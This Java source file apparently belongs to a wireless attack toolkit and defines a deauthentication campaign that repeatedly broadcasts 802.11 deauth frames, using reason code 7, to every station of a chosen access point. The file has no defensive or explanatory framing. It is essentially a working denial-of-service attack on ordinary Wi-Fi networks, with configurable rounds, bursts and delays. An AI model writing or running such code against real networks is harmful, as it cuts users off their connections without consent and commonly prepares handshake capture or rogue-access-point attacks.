package com.opx.oss.engine.attacks;

import com.opx.oss.engine.chips.WifiChip;
import com.opx.oss.engine.dot11.Frame;
import com.opx.oss.engine.dot11.Mac;

import org.json.JSONObject;

/** Broadcast deauthentication: the AP's stations are told to leave, in bursts. */
public final class DeauthCampaign extends Campaign {

    /** Reason 7: a class-3 frame arrived from a station that is not associated. */
    private static final int REASON = 7;

    private final int rounds;
    private final int bursts;
    private final long gapMillis;

    public DeauthCampaign(WifiChip chip, String bssid, JSONObject options) {
        super(chip, bssid, options);
        this.rounds = Math.max(1, options.optInt("rounds", 5));
        this.bursts = Math.max(1, options.optInt("bursts", 8));
        this.gapMillis = Math.max(20, options.optLong("gap", 200));
    }

    @Override
    public String kind() {
        return "deauth";
    }

    @Override
    protected void run(Events events) throws Exception {
        byte[] target = Mac.of(bssid);
        log(events, "sending deauth bursts to every station of " + bssid);
        int sent = 0;
        for (int round = 1; round <= rounds && !shouldStop(); round++) {
            for (int burst = 0; burst < bursts && !shouldStop(); burst++) {
                chip.transmit(Frame.deauthAll(target, REASON));
                sent++;
            }
            progress(events, (round * 100) / rounds, "round " + round + " of " + rounds);
            sleep(gapMillis);
        }
        log(events, "sent " + sent + " deauth frames");
    }
}
